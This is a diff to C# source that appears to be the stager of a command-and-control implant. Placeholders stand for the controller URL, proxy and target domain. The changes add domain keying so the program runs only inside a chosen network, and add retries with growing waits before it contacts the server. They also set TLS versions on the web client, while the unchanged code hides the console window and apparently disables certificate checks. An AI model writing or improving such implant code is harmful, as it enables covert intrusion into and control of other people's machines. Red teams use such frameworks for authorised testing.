@@ -30,24 +30,48 @@ public class Program
 	public static string[] dfhead = null;
 	private static string[] basearray = {#REPLACEBASEURL#};
 	public static string[] rotate = null;
+
 	public static void Sharp()
 	{
+		if(!string.IsNullOrEmpty("#REPLACEMEDOMAIN#") && !Environment.UserDomainName.Contains("#REPLACEMEDOMAIN#"))
+		{
+			return;
+		}
+
 		var handle = GetConsoleWindow();
 		ShowWindow(handle, SW_HIDE);
 		AUnTrCrts();
-		try { primer(); } catch {
+
+		if(#REPLACESTAGERRETRIES#)
+		{
+			int limit = #REPLACESTAGERRETRIESLIMIT#;
+			int waitTime = #REPLACESTAGERRETRIESWAIT# * 1000;
 			var mre = new System.Threading.ManualResetEvent(false);
-			mre.WaitOne(300000);
-			try { primer(); } catch {
-				mre.WaitOne(600000);
-				try { primer(); } catch { }
+			while (true && limit > 0) 
+			{
+				try {
+					primer();
+					break;
+				} catch {
+					limit = limit -1;
+					mre.WaitOne(waitTime);
+					waitTime = waitTime * 2;
+				}
 			}
 		}
+		else
+		{
+			primer();
+		}
+
+
 	}
+
 	public static void Main()
 	{
 		Sharp();
 	}
+
     static string[] CLArgs(string cl)
     {
         int argc;
@@ -79,6 +103,11 @@ public class Program
 	}
 	static System.Net.WebClient GetWebRequest(string cookie)
 	{
+		try {
+			ServicePointManager.SecurityProtocol = (SecurityProtocolType)192 |(SecurityProtocolType)768 | (SecurityProtocolType)3072;			
+		} catch (Exception e) {
+			Console.WriteLine(e.Message);
+		}
 		var x = new System.Net.WebClient();
 
 		var purl = @"#REPLACEPROXYURL#";
@@ -571,4 +600,3 @@ public class Program
 		}
 	}
 }
-
